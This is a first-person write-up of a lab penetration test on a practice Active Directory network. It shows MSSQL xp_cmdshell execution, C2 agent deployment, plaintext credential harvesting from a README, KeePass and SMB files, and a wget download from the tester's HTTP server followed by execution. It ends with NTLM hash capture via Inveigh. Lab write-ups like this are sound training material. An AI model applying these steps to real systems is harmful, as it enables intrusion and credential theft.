So since i have already solved this network i will skip the scope and objectives and jump straight in

# Setting listeners
So to start ill set 5 listeners for the 5 machines in subnet 2

For this ill be using adaptix C2 framework

![](Pasted%20image%2020260419153718.png)

All listeners are now set

# Retrieving credentials for `sql_svc`
Ill log into the web portal as the guest user and then query the sql_svc account to get the credentials

![548](Pasted%20image%2020260419153956.png)

```python
sql_svc:SqLS3rvic3!
```

```python
nxc mssql sql.ext.darkhaven.local -u 'sql_svc' -p 'SqLS3rvic3!'                              
MSSQL       10.10.10.133    1433   SQL              [*] Windows 11 / Server 2025 Build 26100 (name:SQL) (domain:ext.darkhaven.local) (EncryptionReq:False)
MSSQL       10.10.10.133    1433   SQL              [+] ext.darkhaven.local\sql_svc:SqLS3rvic3!
```
These credentials get me access to mssql on the sql server

```python
impacket-mssqlclient ext.darkhaven.local/sql_svc:'SqLS3rvic3!'@sql.ext.darkhaven.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed database context to 'master'.
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (sql_svc  dbo@master)> xp_cmdshell whoami
output                
-------------------   
nt authority\system   
NULL                  
SQL (sql_svc  dbo@master)>
```
xp_cmdshell is enabled

So on my listener for the sql server ill generate an agent and transfer it to the target

# NT authority system on the sql server

![466](Pasted%20image%2020260419154400.png)

Ive generated an agent for the sql listener and i can use xp_cmdshell to upload the agent then execute it

```python
SQL (sql_svc  dbo@master)> upload sql-agent.x64.exe C:\Users\Public\sql-agent.x64.exe
[+] Data length (b64-encoded): 117.34 KB with MD5: 48dcfdd66584938be5074d4bcc9553e8
[+] Uploading...
[+] Uploaded
[+] certutil -decode "C:\Users\Public\sql-agent.x64.exe.b64" "C:\Users\Public\sql-agent.x64.exe"
[+] del "C:\Users\Public\sql-agent.x64.exe.b64"
[+] certutil -hashfile "C:\Users\Public\sql-agent.x64.exe" MD5
[+] MD5 hashes match
SQL (sql_svc  dbo@master)> 
```
This uploaded the agent to the target

```python
SQL (sql_svc  dbo@master)> xp_cmdshell C:\Users\Public\sql-agent.x64.exe
```
This executed the agent so now if i look back at adaptix client ive got a connection

![](Pasted%20image%2020260419154739.png)

![](Pasted%20image%2020260419154806.png)

The SQL server is now compromised

# Administrator on the share server
![](Pasted%20image%2020260419154955.png)

Found a keepass database and a read me

```python
[19/04 15:50:38] operator [c5311829] beacon > cat README.txt
[19/04 15:50:38] [*] Task: read file
[19/04 15:50:41] [*] Agent called server, sent [27 bytes]
[19/04 15:50:41] [+] 'README.txt' file content:
﻿Darkhaven Technologies - IT Department Password Store
======================================================
File   : it_passwords.kdbx
Format : KeePass 2.x

Contents:
  - Network Infrastructure
      > Core Switch (sw-core-01)
      > Firewall Admin (fw-ext-01)
      > Out-of-Band Management (OOBM)
  - Servers
      > Domain Controller (dc.ext.darkhaven.local)
      > SQL Server (sql.ext.darkhaven.local)
      > Backup Server (bkp-01.ext.darkhaven.local)
  - Service Accounts
      > sql_svc           (SQL Server service account)
      > svc_backup        (Veeam Backup)
      > svc_monitoring    (SCOM data collector)
      > svc_webpool       (IIS application pool)
      > svc_sccm          (SCCM network access)
  - Cloud / SaaS
      > Azure Portal
      > Microsoft 365 Admin Center
      > Cloudflare DNS

IMPORTANT: Do not copy outside the management VLAN.
Access requests: it-security@darkhaven.local

Master Password: D@rkhav3n_IT_2024!
```
Its given me the master password for the keepass file so it saves me cracking it

Ill download the keepass database to my machine

```python
[19/04 15:52:11] operator [1b1823fc] beacon > download it_passwords.kdbx
[19/04 15:52:11] [*] Task: download file
[19/04 15:52:11] [*] Agent called server, sent [34 bytes]
[19/04 15:52:12] [+] The download of the 'C:\stored_passwords\it_passwords.kdbx' file (2782 bytes) has started: [fid ac755ec0]
[19/04 15:52:12] [+] File download complete: [fid ac755ec0]
```
This downloaded it now i can sync it to the client in adaptix to access it

![](Pasted%20image%2020260419155901.png)

```python
showard:5rtfgvb^RTFGVB
```

Ill connect via SMB on share.ext using these credentials and access the DarkHavenData share

Found an interesing file at \IT\Network\Runbooks\

```python
-- NETWORK PROVISIONING SERVICE ACCOUNT --
  Host      : share.ext.darkhaven.local (10.10.10.135)
  Username  : svc_netops
  Password  : N3t0ps$Svc_2024!
  Role      : Local Administrator on share server
  Purpose   : Automated network configuration backup scripts
              Runs nightly at 02:00 to pull switch/FW configs via TFTP
```
The file had some credentials inside

```python
svc_netops:N3t0ps$Svc_2024!
```

![668](Pasted%20image%2020260419161023.png)

I am able to get access via RDP on the share server and since the account is a localadmin i can open an administrator session

Now i have this i can set a beacon up again on this since i am now an administrator on the share server

![477](Pasted%20image%2020260419161241.png)

Ive generated the agent now i can transfer it to the target ill do this with a python webserver

```python
python3 -m http.server 1337  
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

```python
PS C:\Users\svc_netops\Documents> wget http://192.168.211.2:1337/share-agent.x64.exe -o share-agent.x64.exe
```
This downloaded the file

Now i can execute it!

```python
.\share-agent.x64.exe
```
This executed it!

![](Pasted%20image%2020260419161706.png)

I now have a second session on the domain this time on the Share server

Remembering the backup procedure i found earllier in the SMB share i already know there is a process where users connect to a SMB share i might be able to intercept NTLM hashes

I can do this with inveigh

```python
svc_webpool::EC2AMAZ-IKFPL26:F183554159AB8EDD:DBBE87BCAF1F8E2C5FBC704B4BC35245:0101000000000000F0FA429879C7DC01EFED8D004E206D2500000000020012004400410052004B0048004100560045004E0001000A0053004800410052004500040026006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C0003003200730068006100720065002E006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C00050026006500780074002E006400610072006B0068006100760065006E002E006C006F00630061006C0007000800F0FA429879C7DC0106000400020000000800300030000000000000000000000000300000078B9E06F4ADD88F1FC47C5DAF96AFE83E05BFC550C86CFE5173879BD7B377ED0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310030002E003100330035000000000000000000
```
After uploading and runnign inveigh on the target via my C2 session i retrieved a hash for the svc_webpool



